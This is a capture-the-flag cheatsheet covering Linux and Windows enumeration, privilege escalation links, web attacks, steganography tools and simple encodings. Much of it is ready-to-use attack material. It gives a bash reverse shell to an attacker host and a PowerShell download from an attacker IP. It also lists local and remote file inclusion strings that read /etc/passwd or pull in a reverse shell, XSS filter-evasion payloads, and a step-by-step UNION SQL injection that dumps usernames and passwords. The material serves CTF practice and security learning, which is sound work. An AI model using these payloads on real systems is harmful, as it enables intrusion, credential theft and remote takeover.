---


---

<h1 id="ctf-cheatsheet">CTF Cheatsheet</h1>
<h2 id="system">System</h2>
<h3 id="linux">Linux</h3>
<h4 id="enumeration">Enumeration</h4>
<ul>
<li>rebootuser: <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum</a></li>
<li>find all SUID/SGID executables:</li>
</ul>
<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">find</span> / -type f -a \<span class="token punctuation">(</span> -perm -u+s -o -perm -g+s \<span class="token punctuation">)</span> -exec <span class="token function">ls</span> -l <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">&gt;</span> /dev/null
</code></pre>
<h5 id="samba">Samba</h5>
<pre class=" language-bash"><code class="prism  language-bash">smbclient -L <span class="token punctuation">[</span>victim's IP<span class="token punctuation">]</span>
</code></pre>
<h4 id="privilege-escalation">Privilege escalation</h4>
<ul>
<li>netbiosX: <a href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">Linux-Privilege-Escalation.md</a></li>
<li>swisskyrepo: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">Linux - Privilege Escalation.md</a></li>
<li>sushant747: <a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">privilege_escalation_-_linux.html</a></li>
<li>payatu: <a href="https://payatu.com/guide-linux-privilege-escalation">guide-linux-privilege-escalation</a></li>
<li><a href="https://gtfobins.github.io/">GTFOBins</a></li>
</ul>
<h4 id="reverse-shell-and-meterpreter">Reverse shell and Meterpreter</h4>
<pre class=" language-bash"><code class="prism  language-bash">/bin/bash -c <span class="token string">'bash -i &gt;&amp; /dev/tcp/attacker ip/port 0&gt;&amp;1'</span>
</code></pre>
<ul>
<li><a href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey</a></li>
<li>swisskyrepo: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadAllTheThings</a></li>
<li>danielmiessler’s SecLists: <a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">Web Shells</a></li>
<li><a href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/">MSFVenom Reverse Shell Payload</a></li>
</ul>
<h3 id="windows">Windows</h3>
<h4 id="powershell">Powershell</h4>
<h5 id="download-file-from-server">Download file from server</h5>
<pre class=" language-powershell"><code class="prism  language-powershell">powershell <span class="token operator">-</span>c <span class="token function">Invoke-WebRequest</span> <span class="token operator">-</span>Uri http:<span class="token operator">/</span><span class="token operator">/</span>ATTACK_IP:ATTACK_PORT<span class="token operator">/</span>FILE <span class="token operator">-</span>OutFile NAME_FILE
</code></pre>
<h4 id="get-service-name">Get service name</h4>
<pre class=" language-powershell"><code class="prism  language-powershell">powershell <span class="token operator">-</span>c <span class="token function">Get-Service</span>
</code></pre>
<h4 id="enumeration-for-privesc">Enumeration for privesc</h4>
<ul>
<li>powershell <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp</a></li>
</ul>
<h2 id="web">Web</h2>
<h3 id="enumeration-1">Enumeration</h3>
<h4 id="basics">Basics</h4>
<ul>
<li>View the Page source</li>
<li>Enable Inspector</li>
<li>View with different browser (Firefox &amp; Chrome)</li>
<li>Debugger</li>
<li>Console</li>
</ul>
<h4 id="content-discovery">Content discovery</h4>
<h5 id="manual-discovery">Manual discovery</h5>
<ul>
<li>/robots.txt: pages pages discovery</li>
<li><a href="https://wiki.owasp.org/index.php/OWASP_favicon_database">wiki.owasp.org</a>: framework discovery using favicon leftover</li>
<li>/sitemap.xml: almost like robots.txt</li>
<li>HTTP headers: Use curl or Burp Suite</li>
<li>Google dorking/hacking</li>
<li>Wappalyzer: browser extension</li>
<li><a href="https://archive.org/web/">The Wayback Machine</a>: discover old websites</li>
<li>Github</li>
<li>Amazon S3 Bucket</li>
</ul>
<h5 id="automated-discovery">Automated discovery</h5>
<ul>
<li><a href="https://github.com/ffuf/ffuf">ffuf</a>: already in Kali</li>
<li>dirb command: in Kali</li>
<li>gobuster: in Kali</li>
</ul>
<h4 id="subdomain-discovery">Subdomain discovery</h4>
<ul>
<li><a href="https://crt.sh/">crt.sh</a></li>
<li>Google dorking: <code>site:*.website.com</code></li>
<li><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></li>
<li><a href="https://github.com/ffuf/ffuf">ffuf</a>: already in Kali</li>
<li><a href="https://dnsdumpster.com/">DNSDumpster</a></li>
<li><a href="https://www.shodan.io/">Shodan.io</a></li>
</ul>
<h4 id="username-enumeration">Username enumeration</h4>
<ul>
<li><a href="https://github.com/ffuf/ffuf">ffuf</a>:</li>
</ul>
<pre class=" language-bash"><code class="prism  language-bash">ffuf -w wordslist -X POST -d <span class="token string">"query"</span> -H <span class="token string">"Content-type: [...]"</span> -u http://VICTIM_IP/path/to/register -mr <span class="token string">"matchin regex"</span>
</code></pre>
<blockquote>
<p>matching regex could be “username already exists”</p>
</blockquote>
<h4 id="vulnerabilities">Vulnerabilities</h4>
<h5 id="insecure-direct-object-reference-idor">Insecure Direct Object Reference (IDOR)</h5>
<p>In URL, check for params like <code>?id=1234</code></p>
<h5 id="file-inclusion">File Inclusion</h5>
<ul>
<li>Common LFI: <code>?file=/etc/passwd</code></li>
<li>Wildcards (not tested yet): <code>?file=/e?c/?asswd</code></li>
<li>Path traversal: <code>?file=../../../../etc/passwd</code></li>
<li>Null byte: <code>?file=../../../../etc/passwd%00</code></li>
<li><code>?file=../../../../etc/passwd/.</code></li>
<li>Remote File Inclusion: <code>?file=http://ip/reverse-shell</code></li>
</ul>
<h5 id="server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)</h5>
<h5 id="cross-site-scripting-xss">Cross Site Scripting (XSS)</h5>
<pre class=" language-html"><code class="prism  language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

Evade closing tag
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

Evade <span class="token string">"script"</span> string
<span class="token operator">&lt;</span>SCRIPT<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sscriptcript</span><span class="token punctuation">&gt;</span></span>alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sscriptcript</span><span class="token punctuation">&gt;</span></span>

Other tag like img
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/img-source<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation">=</span>alert(1)</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<h5 id="sql-injection">SQL Injection</h5>
<h5 id="in-band-sqli">In-band SQLi</h5>
<ul>
<li>Get number of column</li>
</ul>
<pre class=" language-sql"><code class="prism  language-sql"><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">-- etc... until error not showing</span>
</code></pre>
<ul>
<li>Get database name</li>
</ul>
<pre class=" language-sql"><code class="prism  language-sql"><span class="token number">0</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>For exemple, if url ends with ‘?id=’, putting 1 will show some data that we don’t want. By putting 0 instead, only the data we want will be showed</p>
</blockquote>
<ul>
<li>Get table names</li>
</ul>
<pre class=" language-sql"><code class="prism  language-sql"><span class="token number">0</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span> <span class="token string">'db_name'</span>
</code></pre>
<ul>
<li>Get column names</li>
</ul>
<pre class=" language-sql"><code class="prism  language-sql"><span class="token number">0</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name<span class="token operator">=</span><span class="token string">'tb_name'</span>
</code></pre>
<ul>
<li>Stealing info</li>
</ul>
<pre class=" language-sql"><code class="prism  language-sql"><span class="token number">0</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>col_name <span class="token keyword">FROM</span> tb_name
<span class="token number">0</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>col1<span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span>col2 SEPARATOR <span class="token string">'&lt;br&gt;'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> tb_name
</code></pre>
<blockquote>
<p>If col1 = user and col2 = password, second line output will be:<br>
user1:pass1<br>
user2:pass2<br>
etc…</p>
</blockquote>
<h5 id="blind-sqli---bypass">Blind SQLi - Bypass</h5>
<pre class=" language-sql"><code class="prism  language-sql"><span class="token operator">OR</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">--</span>
</code></pre>
<h5 id="blind-sqli---boolean-based">Blind SQLi - Boolean based</h5>
<pre class=" language-sql"><code class="prism  language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli_three'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token operator">and</span> column_name<span class="token operator">=</span><span class="token string">'password'</span><span class="token operator">and</span> column_name<span class="token operator">=</span><span class="token string">'usern%'</span><span class="token punctuation">;</span><span class="token comment">--</span>
</code></pre>
<p>After:</p>
<pre class=" language-sql"><code class="prism  language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> password <span class="token operator">like</span> <span class="token string">'%'</span><span class="token punctuation">;</span><span class="token comment">--</span>
</code></pre>
<h5 id="blind-sqli---time-based">Blind SQLi - Time based</h5>
<h2 id="steganography">Steganography</h2>
<h3 id="image">Image</h3>
<ul>
<li><code>steghide</code>: Hide and extract data</li>
<li><code>stegcracker</code>: crack password used to hide data into file</li>
<li><code>binwalk</code>: List all files (with their extension and offset bytes) hidden in files</li>
<li><code>strings</code>: Display all readable characters</li>
<li><code>file</code>: Display file type</li>
</ul>
<h3 id="audio">Audio</h3>
<p>Software: Audacity</p>
<h2 id="encoding">Encoding</h2>
<h3 id="shifting">Shifting</h3>
<ul>
<li>Rot1, Rot13, Rot47, etc.</li>
<li>Caesar cypher</li>
</ul>
<h3 id="translation">Translation</h3>
<ul>
<li>Binary, Decimal, Hexadecimal, Base 64</li>
<li>Base32</li>
<li>Morse code</li>
<li>L33t</li>
</ul>

